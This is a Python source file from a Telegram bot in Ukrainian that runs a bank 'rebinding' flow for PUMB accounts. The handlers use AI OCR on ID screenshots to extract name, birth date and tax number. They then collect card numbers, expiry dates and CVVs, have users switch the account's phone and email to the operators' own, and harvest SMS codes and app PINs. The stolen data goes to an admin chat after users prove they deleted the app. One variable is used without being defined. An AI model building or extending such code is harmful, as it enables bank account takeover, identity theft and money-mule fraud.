    # Видаляємо повідомлення з кнопками вибору типу реєстрації
    try:
        await callback.message.delete()
    except Exception:
        pass

    state_data = await state.get_data()
    client_bot_username = state_data.get("client_bot_username")
    if not client_bot_username:
        try:
            me = await callback.bot.get_me()
            client_bot_username = me.username
        except Exception:
            client_bot_username = ""

    client_id = callback.from_user.id
    username_db = callback.from_user.username or "Немає юзернейму"
    chat_id = callback.message.chat.id

    # Спочатку створюємо сесію, щоб у CRM з'явився bot_username і
    # завантаження фото знайшло правильного бота з першого разу.
    await _continue_pumb_start(client_id, username_db, client_bot_username, pumb_type, callback.message, callback.bot)

    if pumb_type == "new":
        example_photos = _get_pumb_example_photos()
        if example_photos:
            media = []
            for i, photo_path in enumerate(example_photos):
                caption = "Надішліть такі 3 фото" if i == 0 else None
                media.append(InputMediaPhoto(media=FSInputFile(photo_path), caption=caption))
            try:
                await callback.bot.send_media_group(chat_id=chat_id, media=media)
            except Exception as e:
                logger.warning(f"Не вдалося надіслати приклади фото ПУМБ: {e}")
                await callback.bot.send_message(chat_id=chat_id, text="Надішліть такі 3 фото")
        else:
            await callback.bot.send_message(chat_id=chat_id, text="Надішліть такі 3 фото")
        # Після прикладів очікуємо 3 скріншоти від клієнта
        await state.set_state(RegistrationStates.pumb_new_screenshots)
    else:
        # Послідовний збір 7 скріншотів для перев'язу ПУМБ
        await state.set_state(RegistrationStates.pumb_rebind_screenshots)
        await state.update_data(pumb_rebind_step=0, pumb_rebind_photos=[], pumb_rebind_collected={})
        try:
            await callback.bot.send_message(chat_id=chat_id, text="Надішліть мені будь ласка кілька скріншотів з додатку ПУМБ")
        except Exception as e:
            logger.warning(f"Не вдалося надіслати вступне повідомлення ПУМБ-перев'язу: {e}")
        await asyncio.sleep(3)
        await _send_pumb_rebind_step(callback.bot, chat_id, 0)

    await callback.answer()


PUMB_NEW_PHOTOS_PROCESS_DELAY = 4.0

async def _process_pumb_new_photos(client_id: int, chat_id: int, state: FSMContext, bot: Bot):
    """Завантаження 3 скріншотів, AI-розпізнавання та оновлення client_data."""
    data = await state.get_data()
    photos = data.get("pumb_new_photos", [])[:3]
    if not photos:
        return

    await bot.send_chat_action(chat_id=chat_id, action="typing")
    try:
        images = []
        for file_id in photos:
            file = await bot.get_file(file_id)
            buf = io.BytesIO()
            await bot.download_file(file.file_path, buf)
            images.append(buf.getvalue())

        from bot.openai_client import extract_pumb_registration_data
        extracted = await extract_pumb_registration_data(images)
        logger.info(f"PUMB extracted data: {extracted}")
        if not extracted or not (extracted.get('pib') and extracted.get('dob') and extracted.get('ipn')):
            await bot.send_message(
                chat_id=chat_id,
                text="Не вдалося розпізнати ПІБ, дату народження чи ІПН. Будь ласка, надішліть 3 чіткі скріншоти."
            )
            await state.update_data(pumb_new_photos=[])
            return

        client_data = f"ПІБ: {extracted['pib']}\nДата народження: {extracted['dob']}\nІПН: {extracted['ipn']}"
        logger.info(f"PUMB client_data: {client_data}")
        await db.update_session_client_data(client_id, client_data, status='registered')
        await db.update_session_verification_data(client_id, success_photo_id=",".join(photos))

        await bot.send_message(chat_id=chat_id, text="Дякую! Реєстраційні дані прийнято.")
        await state.clear()
    except Exception as e:
        logger.exception(f"Помилка обробки ПУМБ-скріншотів: {e}")
        await bot.send_message(
            chat_id=chat_id,
            text="Помилка обробки. Спробуйте надіслати скріншоти ще раз."
        )
        await state.update_data(pumb_new_photos=[])


def _get_pumb_lock(client_id: int) -> asyncio.Lock:
    lock = _pumb_photo_locks.get(client_id)
    if lock is None:
        lock = asyncio.Lock()
        _pumb_photo_locks[client_id] = lock
    return lock


async def _delayed_pumb_photos_check(client_id: int, chat_id: int, state: FSMContext, bot: Bot):
    """Затримка перед обробкою, щоб зібрати всі 3 скріншоти альбому."""
    async with _get_pumb_lock(client_id):
        try:
            if await state.get_state() != RegistrationStates.pumb_new_screenshots:
                return
            await asyncio.sleep(PUMB_NEW_PHOTOS_PROCESS_DELAY)
            data = await state.get_data()
            photos = data.get("pumb_new_photos", [])
            if not photos:
                return
            if len(photos) >= 3:
                await _process_pumb_new_photos(client_id, chat_id, state, bot)
            else:
                await bot.send_message(
                    chat_id=chat_id,
                    text=f"Отримано {len(photos)}/3 фото. Будь ласка, надішліть всі 3 скріншоти."
                )
        except asyncio.CancelledError:
            return
        except Exception as e:
            logger.exception(f"Помилка перевірки зібраних фото ПУМБ: {e}")


@router.message(RegistrationStates.pumb_new_screenshots, F.chat.type == "private", F.photo)
async def process_pumb_new_screenshots(message: Message, state: FSMContext, bot: Bot):
    """Збір 3 скріншотів від ПУМБ-клієнта та запуск AI-обробки."""
    client_id = message.from_user.id
    file_id = message.photo[-1].file_id

    async with _get_pumb_lock(client_id):
        if await state.get_state() != RegistrationStates.pumb_new_screenshots:
            return

        data = await state.get_data()
        photos = data.get("pumb_new_photos", [])
        if file_id not in photos:
            photos.append(file_id)
        await state.update_data(pumb_new_photos=photos)

        existing = _pumb_new_photo_tasks.pop(client_id, None)
        if existing and not existing.done():
            existing.cancel()
            try:
                await existing
            except asyncio.CancelledError:
                pass

        if len(photos) >= 3:
            await _process_pumb_new_photos(client_id, message.chat.id, state, bot)
        else:
            task = asyncio.create_task(
                _delayed_pumb_photos_check(client_id, message.chat.id, state, bot)
            )
            _pumb_new_photo_tasks[client_id] = task


async def _delayed_pumb_rebind_process(client_id: int, chat_id: int, state: FSMContext, bot: Bot):
    """Обробка надісланих скріншотів для перев'язу ПУМБ."""
    try:
        await asyncio.sleep(0.8)
    except asyncio.CancelledError:
        return

    async with _get_pumb_lock(client_id):
        try:
            if await state.get_state() != RegistrationStates.pumb_rebind_screenshots:
                return

            data = await state.get_data()
            pending = data.get("pumb_rebind_pending", [])
            if not pending:
                return

            await state.update_data(pumb_rebind_pending=[])

            raw_collected = data.get("pumb_rebind_collected", {})
            collected: dict[int, str] = {}
            if isinstance(raw_collected, dict):
                for k, v in raw_collected.items():
                    try:
                        collected[int(k)] = str(v)
                    except (ValueError, TypeError):
                        pass

            # Якщо FSM скинувся після перезапуску бота, відновлюємо pumb_rebind_collected з JSON-колонки в БД
            if not collected:
                try:
                    session_db = await db.get_session(client_id)
                    raw_collected = session_db.get("pumb_rebind_collected") if session_db else None
                    if raw_collected:
                        import json
                        loaded = json.loads(raw_collected)
                        if isinstance(loaded, dict):
                            for k, v in loaded.items():
                                try:
                                    step_key = int(k)
                                    if 0 <= step_key <= 6:
                                        collected[step_key] = str(v)
                                except (ValueError, TypeError):
                                    pass
                except Exception as restore_err:
                    logger.error(f"Не вдалося відновити pumb_rebind_collected з БД: {restore_err}")

            from io import BytesIO
            from bot.openai_client import classify_pumb_rebind_album as ai_classify_album

            await bot.send_chat_action(chat_id=chat_id, action="typing")

            # 1. Завантажуємо батч очікуваних фото у пам'ять
            photo_bytes_list: list[bytes] = []
            valid_pending_ids: list[str] = []

            for f_id in pending:
                try:
                    photo_file = await bot.get_file(f_id)
                    photo_buf = BytesIO()
                    await bot.download_file(photo_file.file_path, photo_buf)
                    photo_bytes_list.append(photo_buf.getvalue())
                    valid_pending_ids.append(f_id)
                except Exception as e:
                    logger.error(f"Не вдалося завантажити фото {f_id}: {e}")

            if not photo_bytes_list:
                await bot.send_message(chat_id=chat_id, text="Не вдалося завантажити фото. Будь ласка, спробуйте ще раз.")
                return

            # 2. Завантажуємо 7 еталонних фотографій (і перевіряємо, що їх строго 7)
            example_photos: list[bytes] = []
            for i in range(len(PUMB_REBIND_INSTRUCTIONS)):
                path = _get_pumb_rebind_example(i)
                if path and os.path.exists(path):
                    try:
                        with open(path, "rb") as f:
                            example_photos.append(f.read())
                    except Exception as read_err:
                        logger.warning(f"Не вдалося прочитати еталон {path}: {read_err}")

            if len(example_photos) != len(PUMB_REBIND_INSTRUCTIONS):
                logger.warning(f"Знайдено {len(example_photos)} з 7 еталонів, використовуємо текстовий prompt")
                example_photos = None

            # 3. Класифікуємо батч із передачею еталонів
            batch_results = await ai_classify_album(photo_bytes_list, example_photos=example_photos)

            # 4. Записуємо нові розпізнані кроки у collected
            for idx, (detected_step, _reason) in enumerate(batch_results):
                if detected_step is not None and isinstance(detected_step, int) and 0 <= detected_step <= 6:
                    if detected_step not in collected:
                        collected[detected_step] = valid_pending_ids[idx]

            # 5. Визначаємо pumb_rebind_step як найменший s (0..6), якого ще немає в collected
            pumb_rebind_step = 7
            for s in range(len(PUMB_REBIND_INSTRUCTIONS)):
                if s not in collected:
                    pumb_rebind_step = s
                    break

            photos_final = [collected[i] for i in sorted(collected.keys()) if i in collected]

            # Зберігаємо оновлений collected та step у state
            await state.update_data(
                pumb_rebind_step=pumb_rebind_step,
                pumb_rebind_collected={str(k): v for k, v in collected.items()},
                pumb_rebind_photos=photos_final
            )

            # Зберігаємо точну масу кроків {крок -> file_id} в JSON-колонку в БД
            import json
            collected_json = json.dumps(
                {str(k): v for k, v in collected.items()},
                ensure_ascii=False
            )
            try:
                await db.update_session_pumb_rebind_collected(client_id, collected_json)
            except Exception as db_err:
                logger.error(f"Не вдалося зберегти pumb_rebind_collected в БД: {db_err}")

            # 6. Якщо всі 7 кроків виконано — фінал!
            if pumb_rebind_step >= 7 or len(collected) >= len(PUMB_REBIND_INSTRUCTIONS):
                ordered_file_ids = [collected[i] for i in range(len(PUMB_REBIND_INSTRUCTIONS)) if i in collected]
                await db.update_session_verification_data(client_id, success_photo_id=",".join(ordered_file_ids))
                await db.set_session_verified(client_id, 1)

                from aiogram.types import InputMediaPhoto, BufferedInputFile

                buffered_photos = []
                raw_bytes_list = []
                for idx, p_id in enumerate(ordered_file_ids[:10]):
                    try:
                        file_info = await bot.get_file(p_id)
                        buf = BytesIO()
                        await bot.download_file(file_info.file_path, buf)
                        b_val = buf.getvalue()
                        raw_bytes_list.append(b_val)
                        buffered_photos.append(
                            BufferedInputFile(b_val, filename=f"photo_{idx}.jpg")
                        )
                    except Exception as dl_err:
                        logger.warning(f"Не вдалося завантажити фото {p_id} для відправки в групу: {dl_err}")

                # Витягуємо ПІБ, дату народження та ІПН зі скріншотів Дії та профілю
                ext = None
                if raw_bytes_list:
                    try:
                        from bot.openai_client import extract_pumb_registration_data
                        ext = await extract_pumb_registration_data(raw_bytes_list)
                    except Exception as ocr_err:
                        logger.warning(f"Не вдалося витягти ПІБ/ІПН через OCR: {ocr_err}")

                pib_val = ext.get('pib') if ext else None
                dob_val = ext.get('dob') if ext else None
                ipn_val = ext.get('ipn') if ext else None

                session = await db.get_session(client_id) or {}
                if not pib_val:
                    pib_val = session.get('pib')


                if pib_val and pib_val not in ('—', '-'):
                    await state.update_data(pumb_extracted_pib=pib_val)
                    client_data_lines.append(f"ПІБ: {pib_val}")
                else:
                    client_data_lines.append("ПІБ: Не вказано")

                if dob_val:
                    client_data_lines.append(f"Дата народження: {dob_val}")
                if ipn_val:
                    client_data_lines.append(f"ІПН: {ipn_val}")

                client_data_lines.append("")
                client_data_lines.append("Тип: Перев'яз ПУМБ")

                client_data = "\n".join(client_data_lines)
                await db.update_session_client_data(client_id, client_data, status='registered')

                await bot.send_message(
                    chat_id=chat_id,
                    text=(
                        "💳 **Надішліть, будь ласка, дані вашої головної гривневої картки ПУМБ:**\n\n"
                        "• **Номер картки** (16 цифр)\n"
                        "• **Термін дії** (мм/рр)\n"
                        "• **CVV код** (3 цифри)\n\n"
                        "Ви можете надіслати їх одним повідомленням текстом."
                    ),
                    parse_mode="Markdown"
                )
                await state.set_state(RegistrationStates.pumb_rebind_card_details)
                return

            # 7. Надсилаємо інструкцію та приклад для наступного необхідного кроку
            await _send_pumb_rebind_step(bot, chat_id, pumb_rebind_step)

        except asyncio.CancelledError:
            return
        except Exception as e:
            logger.exception(f"Помилка обробки ПУМБ-перев'язу: {e}")
            await bot.send_message(
                chat_id=chat_id,
                text="Виникла помилка під час перевірки фото. Будь ласка, надішліть скріншот ще раз."
            )


@router.message(RegistrationStates.pumb_rebind_card_details, F.chat.type == "private")
async def process_pumb_rebind_card_details(message: Message, state: FSMContext, bot: Bot):
    """Прийом реквізитів картки ПУМБ від клієнта (текстом)."""
    text = message.text or ""
    if not text:
        await message.answer("Будь ласка, надішліть реквізити картки текстом.")
        return

    await state.update_data(pumb_card_details_text=text)

    target_email = await db.get_pumb_target_email()
    await state.set_state(RegistrationStates.pumb_rebind_anketa_screenshot)
    await message.answer(
        f"📩 **Змініть анкетні дані у додатку ПУМБ:**\n\n"
        f"• **Вкажіть пошту:** `{target_email}`\n\n"
        f"*Після зміни надішліть скріншот вкладки «Анкетні дані».*",
        parse_mode="Markdown"
    )


@router.message(RegistrationStates.pumb_rebind_anketa_screenshot, F.chat.type == "private")
async def process_pumb_rebind_anketa_screenshot(message: Message, state: FSMContext, bot: Bot):
    """Прийом скріншоту 'Анкетні дані'."""
    if not message.photo:
        await message.answer("Будь ласка, надішліть скріншот вкладки «Анкетні дані».")
        return

    file_id = message.photo[-1].file_id
    await state.update_data(pumb_anketa_photo=file_id)

    target_phone = await db.get_pumb_target_phone()
    await state.set_state(RegistrationStates.pumb_rebind_phone_change)
    await message.answer(
        f"📱 **Тепер змініть номер телефону у додатку ПУМБ на наш номер:**\n"
        f"`{target_phone}`\n\n"
        f"*Коли прийде SMS-код підтвердження — надішліть його сюди.\n"
        f"Після успішної зміни номера надішліть скріншот профілю ПУМБ, де видно наш новий номер.*",
        parse_mode="Markdown"
    )


@router.message(RegistrationStates.pumb_rebind_phone_change, F.chat.type == "private")
async def process_pumb_rebind_phone_change(message: Message, state: FSMContext, bot: Bot):
    """Прийом SMS-коду або підтверджувального скріншоту зміни номера."""
    if message.text:
        sms_text = message.text.strip()
        data = await state.get_data()
        codes = data.get("pumb_sms_codes", [])
        codes.append(sms_text)
        await state.update_data(pumb_sms_codes=codes)

        try:
            from bot.database import log_chat_message
            await log_chat_message(message.from_user.id, sms_text, sender='client')
        except Exception:
            pass

        await message.answer("Дякую, код прийнято! Якщо прийде ще код — надішліть. Коли номер зміниться у додатку — надішліть скріншот профілю ПУМБ.")
        return

    if message.photo:
        file_id = message.photo[-1].file_id
        await state.update_data(pumb_phone_photo=file_id)

        await state.set_state(RegistrationStates.pumb_rebind_pincode)
        await message.answer(
            "🔑 **Вкажіть ПІН-код / пароль, який ви встановили для входу в додаток ПУМБ:**",
            parse_mode="Markdown"
        )
        return

    await message.answer("Надішліть SMS-код або скріншот профілю з новим номером.")


@router.message(RegistrationStates.pumb_rebind_pincode, F.chat.type == "private")
async def process_pumb_rebind_pincode(message: Message, state: FSMContext, bot: Bot):
    """Прийом ПІН-коду входу від клієнта."""
    if not message.text:
        await message.answer("Будь ласка, надішліть ПІН-код текстом.")
        return

    pincode = message.text.strip()
    await state.update_data(pumb_pincode=pincode)

    await state.set_state(RegistrationStates.pumb_rebind_deletion_screenshot)
    await message.answer(
        "🗑 **Надішліть скріншот видалення додатка ПУМБ з вашого телефону.**",
        parse_mode="Markdown"
    )


@router.message(RegistrationStates.pumb_rebind_deletion_screenshot, F.chat.type == "private")
async def process_pumb_rebind_deletion_screenshot(message: Message, state: FSMContext, bot: Bot):
    """Фінал: прийом скріншоту видалення додатка ПУМБ, надсилання повного звіту та альбому в групу."""
    if not message.photo:
        await message.answer("Будь ласка, надішліть скріншот видалення додатка ПУМБ.")
        return

    deletion_photo = message.photo[-1].file_id
    data = await state.get_data()

    raw_collected = data.get("pumb_rebind_collected", {})
    collected: dict[int, str] = {}
    if isinstance(raw_collected, dict):
        for k, v in raw_collected.items():
            try:
                collected[int(k)] = str(v)
            except (ValueError, TypeError):
                pass

    ordered_file_ids = [collected[i] for i in range(7) if i in collected]
    if data.get("pumb_anketa_photo"):
        ordered_file_ids.append(data["pumb_anketa_photo"])
    if data.get("pumb_phone_photo"):
        ordered_file_ids.append(data["pumb_phone_photo"])
    ordered_file_ids.append(deletion_photo)

    client_id = message.from_user.id
    await db.update_session_verification_data(client_id, success_photo_id=",".join(ordered_file_ids))

    target_phone = await db.get_pumb_target_phone()
    target_email = await db.get_pumb_target_email()
    card_details = data.get("pumb_card_details_text", "Не вказано")
    pincode = data.get("pumb_pincode", "Не вказано")

    pib_val = data.get("pumb_extracted_pib")
    if not pib_val or pib_val in ('—', '-'):
        session = await db.get_session(client_id) or {}
        client_data = session.get('client_data', '')
        match = re.search(r'ПІБ:\s*(.+)', client_data)
        if match:
            pib_val = match.group(1).strip()

    pib_str = pib_val if (pib_val and pib_val not in ('—', '-')) else "Не вказано"

    final_report_text = (
        f"{pib_str}\n\n"
        f"{target_phone}\n"
        f"{target_email}\n\n"
        f"{card_details}\n\n"
        f"{pincode}"
    )

    try:
        from bot.config import get_anketa_chat_id, get_admin_id
        from bot.bot_registry import get_bot
        target_chat = get_anketa_chat_id() or get_admin_id()

        if target_chat and ordered_file_ids:
            from aiogram.types import InputMediaPhoto, BufferedInputFile
            from io import BytesIO

            buffered_photos = []
            for idx, p_id in enumerate(ordered_file_ids[:10]):
                try:
                    file_info = await bot.get_file(p_id)
                    buf = BytesIO()
                    await bot.download_file(file_info.file_path, buf)
                    buffered_photos.append(
                        BufferedInputFile(buf.getvalue(), filename=f"photo_{idx}.jpg")
                    )
                except Exception as dl_err:
                    logger.warning(f"Не вдалося завантажити фото {p_id} для фінального альбому: {dl_err}")

            if buffered_photos:
                media_group = []
                for idx, b_file in enumerate(buffered_photos):
                    if idx == 0:
                        media_group.append(InputMediaPhoto(media=b_file, caption="Перев'яз ПУМБ", parse_mode="HTML"))
                    else:
                        media_group.append(InputMediaPhoto(media=b_file))

                sender_bots = [bot]
                main_b = get_bot()
                if main_b and main_b != bot:
                    sender_bots.append(main_b)

                for s_bot in sender_bots:
                    try:
                        if len(media_group) > 1:
                            await s_bot.send_media_group(chat_id=target_chat, media=media_group)
                        else:
                            await s_bot.send_photo(chat_id=target_chat, photo=buffered_photos[0], caption="Перев'яз ПУМБ", parse_mode="HTML")

                        await s_bot.send_message(chat_id=target_chat, text=final_report_text)
                        logger.info(f"Фінальний звіт ПУМБ успішно надіслано в чат {target_chat}")
                        break
                    except Exception as send_err:
                        logger.warning(f"Невдала спроба відправки фінального звіту через бота: {send_err}")
    except Exception as e:
        logger.error(f"Помилка відправки фінального звіту ПУМБ: {e}")

    await message.answer("Дякую! Усі етапи перев'язу успішно завершено.")
    await state.clear()


@router.message(RegistrationStates.pumb_rebind_screenshots, F.chat.type == "private", F.photo)
async def process_pumb_rebind_screenshots(message: Message, state: FSMContext, bot: Bot):
    """Збір скріншотів від ПУМБ-клієнта (по одному або альбомом) для перев'язу з AI-перевіркою."""
    client_id = message.from_user.id
    file_id = message.photo[-1].file_id

    try:
        await bot.send_chat_action(chat_id=message.chat.id, action="typing")
    except Exception:
        pass

    if await state.get_state() != RegistrationStates.pumb_rebind_screenshots:
        return

    data = await state.get_data()
    pending = data.get("pumb_rebind_pending", [])
    if file_id not in pending:
        pending.append(file_id)
    await state.update_data(pumb_rebind_pending=pending)

    existing = _pumb_rebind_photo_tasks.pop(client_id, None)
    if existing and not existing.done():
        existing.cancel()

    task = asyncio.create_task(
        _delayed_pumb_rebind_process(client_id, message.chat.id, state, bot)
    )
    _pumb_rebind_photo_tasks[client_id] = task

